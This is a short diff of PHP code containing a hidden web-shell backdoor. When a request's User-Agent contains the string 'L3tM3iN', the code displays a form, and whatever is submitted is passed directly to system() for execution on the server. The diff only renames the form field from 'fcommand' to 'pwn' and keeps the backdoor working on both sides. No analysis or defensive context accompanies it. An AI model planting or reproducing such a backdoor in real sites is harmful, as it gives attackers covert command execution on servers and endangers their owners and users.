@@ -14,14 +14,14 @@ $ua = $_SERVER['HTTP_USER_AGENT'];
 if(isset($ua)) {
 if (strpos($_SERVER['HTTP_USER_AGENT'], 'L3tM3iN') !== false) {
 echo '<form method="post" action="<?php $_SERVER[\'PHP_SELF\']; ?>">';
-echo '<input type="text" name="fcommand">';
+echo '<input type="text" name="pwn">';
 echo '</center>';
 echo '<button align="right" name="Enter" type="submit" color="white"></button>';
 echo '</form>';
 		  }
 if(isset($_POST['Enter'])) {
-    if(!empty($_POST['fcommand'])) {
-        $command = $_POST['fcommand'];
+    if(!empty($_POST['pwn'])) {
+        $command = $_POST['pwn'];
         $result =  system($command);
         }
     }
